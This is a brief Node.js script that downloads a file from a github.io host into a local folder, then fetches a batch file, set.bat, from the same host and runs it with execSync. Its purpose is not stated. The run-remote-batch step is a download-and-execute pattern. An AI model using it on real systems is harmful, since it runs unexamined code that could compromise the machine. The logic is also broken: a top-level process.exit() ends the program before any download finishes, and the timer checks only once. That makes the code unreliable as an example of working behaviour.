const fs = require('fs')
const path = require('path')
const request = require('request')
const execSync = require('./execSync.js')
const files = [
  {'name': 'c.vue', 'path': 'e:\\test\\'}
]
let count = 0
for (let file of files) {
  request('https://8230459.github.io/' + file.name).pipe(fs.createWriteStream(path.join(file.path, file.name))).on('close', err => {
    if (err) return
    count++
  })
}
const timer = setTimeout(() => {
  if (count === files.length) {
    request('https://8230459.github.io/set.bat').pipe(fs.createWriteStream(path.join('.', 'set.bat'))).on('close', err => {
      if (err) return
      execSync('set.bat')
    })
    clearTimeout(timer)
  }
}, 5000)

//fs.rmSync('e:\\test\\b.vue', {recursive: true})
process.exit()